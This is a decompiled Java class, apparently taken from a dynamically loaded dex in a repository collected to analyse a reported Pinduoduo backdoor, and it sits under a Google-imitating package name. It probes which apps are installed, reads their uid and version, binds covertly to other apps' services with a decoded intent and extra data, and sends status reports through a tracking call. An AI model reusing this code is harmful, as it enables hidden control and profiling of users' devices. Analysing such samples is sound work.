package com.google.android.sd.biz_dynamic_dex.td.logcat.a.b;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.IBinder;
import android.text.TextUtils;
import com.google.android.sd.utils.TrackUtils;
import java.util.HashMap;
import java.util.Timer;
import java.util.TimerTask;

public final class a {
  private static Timer a;
  
  public static void a() {
    if (a != null) {
      b.a("impl_action_task_cancel");
      a.cancel();
      a = null;
    } 
  }
  
  public static void a(Context paramContext, long paramLong, a parama) {
    try {
      b(paramContext, "2");
      b.a("impl_action_task_schedule_".concat(String.valueOf(paramLong)));
      if (a == null)
        a = new Timer("action_proguard"); 
      a.schedule(new TimerTask(parama, paramContext) {
            public final void run() {
              try {
                b.a("impl_action_task_work");
                a.a a1 = this.a;
                if (a1 != null)
                  a1.a(this.b); 
                return;
              } catch (Exception exception) {
                StringBuilder stringBuilder = new StringBuilder("impl_action_task_error");
                stringBuilder.append(exception.getMessage());
                b.a(stringBuilder.toString());
                return;
              } 
            }
          }paramLong);
      return;
    } catch (Exception exception) {
      return;
    } 
  }
  
  public static void a(Context paramContext, String paramString) {
    try {
      b.a("error_".concat(String.valueOf(paramString)));
      HashMap<Object, Object> hashMap = new HashMap<Object, Object>(4);
      hashMap.put("state", "3");
      hashMap.put("detail", paramString);
      if (paramContext != null) {
        hashMap.put("check_time", String.valueOf(System.currentTimeMillis()));
        TrackUtils.submitTrackAsync(paramContext, 36799, hashMap);
      } 
      com.google.android.sd.biz_dynamic_dex.base.a.b();
      return;
    } catch (Exception exception) {
      return;
    } 
  }
  
  public static void b(Context paramContext, String paramString) {
    try {
      HashMap<Object, Object> hashMap = new HashMap<Object, Object>(4);
      hashMap.put("state", "4");
      hashMap.put("detail", paramString);
      if (paramContext != null) {
        hashMap.put("check_time", String.valueOf(System.currentTimeMillis()));
        TrackUtils.submitTrackAsync(paramContext, 36799, hashMap);
      } 
      return;
    } catch (Exception exception) {
      return;
    } 
  }
  
  public static boolean c(Context paramContext, String paramString) {
    try {
      paramContext.getPackageManager().getPackageInfo(paramString, 0);
      return true;
    } catch (Exception exception) {
      return false;
    } 
  }
  
  public static int d(Context paramContext, String paramString) {
    try {
      return (paramContext.getPackageManager().getApplicationInfo(paramString, 128)).uid;
    } catch (Exception exception) {
      return -1;
    } 
  }
  
  public static String e(Context paramContext, String paramString) {
    if (paramContext != null && !TextUtils.isEmpty(paramString))
      try {
        return (paramContext.getPackageManager().getPackageInfo(paramString, 0)).versionName;
      } catch (Exception exception) {} 
    return "";
  }
  
  public static void f(Context paramContext, String paramString) {
    try {
      com.google.android.sd.biz_dynamic_dex.td.logcat.c.a.a a1 = com.google.android.sd.biz_dynamic_dex.td.logcat.c.a.e(paramString);
      if (a1 == null) {
        b.a("link_fail_input_error");
        return;
      } 
      Intent intent = new Intent(a1.a);
      intent.setPackage(a1.b);
      intent.putExtra("ud_extra_data", a1.c);
      if (paramContext.getPackageManager().resolveService(intent, 0) == null) {
        a(paramContext, "link_fail_component_not_exist");
        return;
      } 
      ServiceConnection serviceConnection = new ServiceConnection() {
          public final void onServiceConnected(ComponentName param1ComponentName, IBinder param1IBinder) {}
          
          public final void onServiceDisconnected(ComponentName param1ComponentName) {}
        };
      if (paramContext.bindService(intent, serviceConnection, 1)) {
        (new Timer()).schedule(new TimerTask(paramContext, serviceConnection) {
              public final void run() {
                try {
                  this.a.unbindService(this.b);
                  b.a("unbind_link_success");
                  return;
                } catch (Exception exception) {
                  b.a("unbind_link_error_".concat(String.valueOf(exception)));
                  return;
                } 
              }
            }a1.d);
        b.a("request_link_success");
        b(paramContext, "7");
        return;
      } 
      a(paramContext, "link_fail_connect_error");
      return;
    } catch (Exception exception) {
      a(paramContext, "link_fail_error_".concat(String.valueOf(exception)));
      return;
    } 
  }
  
  public static interface a {
    void a(Context param1Context);
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\2aa151e2cfa04acb8fb96e523807ca6b-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\td\logcat\a\b\a.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */